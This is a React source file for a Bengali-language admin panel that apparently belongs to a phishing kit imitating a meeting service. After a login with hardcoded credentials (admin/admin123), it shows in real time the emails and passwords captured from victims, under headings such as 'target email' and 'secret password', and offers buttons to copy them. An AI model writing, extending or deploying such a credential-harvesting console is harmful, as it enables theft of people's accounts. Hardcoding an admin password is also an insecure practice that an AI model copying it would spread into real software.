
import React, { useState, useEffect } from 'react';
import { MeetingStatus, LoginLog } from '../types';
import { supabase } from '../lib/supabase';

interface AdminDashboardProps {
  status: MeetingStatus;
  onLoginSuccess: () => void;
  onLogout: () => void;
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess, onLogout }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<LoginLog[]>([]);
  const [loading, setLoading] = useState(false);
  const [isLive, setIsLive] = useState(false);

  useEffect(() => {
    if (status === MeetingStatus.ADMIN_DASHBOARD) {
      fetchLogs();
      
      // Real-time listener for new logs
      const subscription = supabase
        .channel('schema-db-changes')
        .on(
          'postgres_changes',
          { event: 'INSERT', schema: 'public', table: 'meet_logs' },
          (payload) => {
            const newLog = payload.new as LoginLog;
            setLogs(prev => [newLog, ...prev]);
            setIsLive(true);
            // Visual alert for new data
            setTimeout(() => setIsLive(false), 3000);
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(subscription);
      };
    }
  }, [status]);

  const fetchLogs = async () => {
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('meet_logs')
        .select('*')
        .order('timestamp', { ascending: false });

      if (error) {
        console.error("Fetch logs error:", error);
        // Fallback to local storage if DB is down
        const savedLogs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
        setLogs(savedLogs.reverse());
      } else {
        setLogs(data as LoginLog[]);
      }
    } catch (err) {
      console.error("Fetch failed:", err);
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'admin' && password === 'admin123') {
      onLoginSuccess();
    } else {
      setError('ভুল ইউজারনেম বা পাসওয়ার্ড দিয়েছেন');
    }
  };

  const clearLogs = async () => {
    if (window.confirm('আপনি কি নিশ্চিত যে সব ডেটা মুছে ফেলতে চান?')) {
      try {
        await supabase.from('meet_logs').delete().neq('email', 'null');
        localStorage.removeItem('meet_logs');
        setLogs([]);
      } catch (err) {
        console.error("Clear failed:", err);
      }
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('কপি করা হয়েছে!');
  };

  if (status === MeetingStatus.ADMIN_LOGIN) {
    return (
      <div className="fixed inset-0 bg-[#0f172a] flex items-center justify-center z-[200] p-4">
        <div className="max-w-md w-full bg-white rounded-3xl p-10 shadow-2xl border border-gray-200">
          <div className="text-center mb-8">
            <div className="w-20 h-20 bg-indigo-100 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-indigo-50">
               <svg className="w-10 h-10 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2-2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </div>
            <h1 className="text-3xl font-black text-gray-900 tracking-tight">অ্যাডমিন প্যানেল</h1>
            <p className="text-gray-500 text-sm mt-2">সঠিক তথ্য দিয়ে লগইন করুন</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-5">
            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">ইউজারনেম</label>
              <input 
                type="text" 
                value={username} 
                onChange={(e) => setUsername(e.target.value)} 
                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none text-gray-900 transition-all font-medium" 
                placeholder="admin"
                autoFocus
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-widest mb-2 ml-1">পাসওয়ার্ড</label>
              <input 
                type="password" 
                value={password} 
                onChange={(e) => setPassword(e.target.value)} 
                className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none text-gray-900 transition-all font-medium" 
                placeholder="••••••••"
              />
            </div>
            {error && (
              <div className="bg-red-50 text-red-600 p-3 rounded-xl text-xs font-bold text-center border border-red-100">
                {error}
              </div>
            )}
            <button type="submit" className="w-full bg-indigo-600 text-white py-4 rounded-2xl font-black hover:bg-indigo-700 transition-all active:scale-95 shadow-xl shadow-indigo-200">
              ড্যাশবোর্ড আনলক করুন
            </button>
            <button type="button" onClick={onLogout} className="w-full text-gray-400 text-sm font-bold hover:text-gray-600 transition-colors">
              ফিরে যান
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-[#f8fafc] z-[200] flex flex-col font-sans text-gray-900 overflow-hidden">
      <header className="bg-white border-b border-gray-200 px-8 py-5 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-5">
          <div className="w-12 h-12 bg-indigo-600 rounded-2xl flex items-center justify-center text-white shadow-indigo-200 shadow-xl rotate-3">
            <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
          </div>
          <div>
            <h1 className="text-2xl font-black tracking-tighter text-gray-900">অ্যাডমিন কন্ট্রোল</h1>
            <div className="flex items-center gap-2 mt-0.5">
              <span className={`w-2 h-2 rounded-full ${isLive ? 'bg-green-500 animate-ping' : 'bg-green-500'}`}></span>
              <p className="text-[10px] text-green-600 font-black uppercase tracking-widest">লাইভ সার্ভার কানেক্টেড</p>
            </div>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <button 
            onClick={fetchLogs}
            className="p-3 bg-gray-100 hover:bg-gray-200 rounded-xl transition-all active:rotate-180 duration-500"
            title="রিফ্রেশ করুন"
          >
            <svg className={`w-5 h-5 text-gray-600 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
          </button>
          <button 
            onClick={onLogout}
            className="px-6 py-3 bg-gray-900 text-white rounded-2xl text-sm font-black hover:bg-black transition-all active:scale-95 shadow-lg shadow-gray-200"
          >
            লগ আউট
          </button>
        </div>
      </header>

      <main className="flex-1 overflow-y-auto p-8">
        <div className="max-w-7xl mx-auto">
          {/* Stats Section */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
            <div className="bg-white p-7 rounded-3xl shadow-sm border border-gray-100">
              <p className="text-gray-400 text-[10px] font-black uppercase tracking-widest">মোট ইউজার</p>
              <h2 className="text-5xl font-black mt-2 text-indigo-600 tracking-tighter">{logs.length}</h2>
              <div className="w-full bg-gray-100 h-1 mt-4 rounded-full overflow-hidden">
                <div className="bg-indigo-600 h-full w-2/3"></div>
              </div>
            </div>
            
            <div className="bg-indigo-600 p-7 rounded-3xl shadow-xl shadow-indigo-100 col-span-1 md:col-span-3 text-white flex items-center justify-between relative overflow-hidden">
               <div className="relative z-10">
                 <h3 className="text-2xl font-black tracking-tight">রিয়েল-টাইম লগ মনিটর</h3>
                 <p className="text-indigo-100 mt-2 font-medium opacity-80 max-w-lg">আপনার সাইটে কেউ সাইলেন্ট করলে তাদের ইমেইল এবং পাসওয়ার্ড এখানে অটোমেটিক চলে আসবে। পেজ রিফ্রেশ করার প্রয়োজন নেই।</p>
               </div>
               <div className="absolute right-[-20px] top-[-20px] w-48 h-48 bg-white/10 rounded-full blur-3xl"></div>
               <div className="absolute left-[-20px] bottom-[-20px] w-32 h-32 bg-black/10 rounded-full blur-2xl"></div>
            </div>
          </div>

          {/* Table Section */}
          <div className="bg-white rounded-3xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="px-10 py-6 border-b border-gray-50 flex items-center justify-between bg-gray-50/30">
              <h3 className="font-black text-gray-800 text-xl tracking-tight">ক্যাপচার করা ডেটা লিস্ট</h3>
              <button 
                onClick={clearLogs}
                className="text-[10px] font-black text-red-500 hover:text-white hover:bg-red-500 uppercase tracking-widest border-2 border-red-50 px-5 py-2.5 rounded-2xl transition-all"
              >
                সব মুছুন
              </button>
            </div>
            <div className="overflow-x-auto">
              <table className="w-full text-left">
                <thead>
                  <tr className="bg-white text-[11px] text-gray-400 uppercase font-black tracking-widest border-b border-gray-50">
                    <th className="px-10 py-6">অবস্থা</th>
                    <th className="px-10 py-6">টার্গেট ইমেইল</th>
                    <th className="px-10 py-6">গোপন পাসওয়ার্ড</th>
                    <th className="px-10 py-6 text-right">ক্যাপচারের সময়</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-50">
                  {logs.length > 0 ? logs.map((log, index) => (
                    <tr key={log.id || index} className={`hover:bg-indigo-50/50 transition-all group ${index === 0 && isLive ? 'bg-green-50 animate-pulse' : ''}`}>
                      <td className="px-10 py-6">
                         <div className="flex items-center gap-3">
                           <div className="w-3 h-3 bg-green-500 rounded-full shadow-lg shadow-green-100"></div>
                           <span className="text-xs font-black text-green-600 uppercase tracking-tighter">ক্যাপচারড</span>
                         </div>
                      </td>
                      <td className="px-10 py-6">
                        <div className="flex flex-col">
                          <span className="font-black text-gray-900 text-base">{log.email}</span>
                          <button 
                            onClick={() => copyToClipboard(log.email)}
                            className="text-[10px] text-indigo-500 font-bold hover:underline w-fit mt-1 opacity-0 group-hover:opacity-100 transition-all"
                          >
                            ইমেইল কপি করুন
                          </button>
                        </div>
                      </td>
                      <td className="px-10 py-6">
                        <div className="flex flex-col">
                          <span className="font-mono text-lg text-red-600 font-black bg-red-50 px-3 py-1 rounded-xl w-fit border border-red-100 select-all">
                            {log.password}
                          </span>
                          <button 
                            onClick={() => copyToClipboard(log.password)}
                            className="text-[10px] text-red-500 font-bold hover:underline w-fit mt-1 opacity-0 group-hover:opacity-100 transition-all"
                          >
                            পাসওয়ার্ড কপি করুন
                          </button>
                        </div>
                      </td>
                      <td className="px-10 py-6 text-sm text-gray-400 text-right font-bold">
                        {log.timestamp ? new Date(log.timestamp).toLocaleString('bn-BD') : 'N/A'}
                      </td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan={4} className="px-10 py-32 text-center">
                        <div className="flex flex-col items-center gap-6 opacity-30">
                          <div className="w-24 h-24 border-8 border-gray-100 border-t-indigo-600 rounded-full animate-spin"></div>
                          <p className="text-xl font-black text-gray-900 uppercase tracking-widest">নতুন ডেটার জন্য অপেক্ষা করা হচ্ছে...</p>
                        </div>
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </main>
      
      <footer className="bg-white border-t border-gray-100 px-10 py-6 text-[10px] text-gray-400 font-black uppercase tracking-[0.3em] flex justify-between">
         <span>অ্যাডমিন কন্ট্রোল প্যানেল v3.0 — সিকিউরড মোড</span>
         <span>সুপার অ্যাডমিন হিসেবে লগইন আছেন</span>
      </footer>
    </div>
  );
};

export default AdminDashboard;
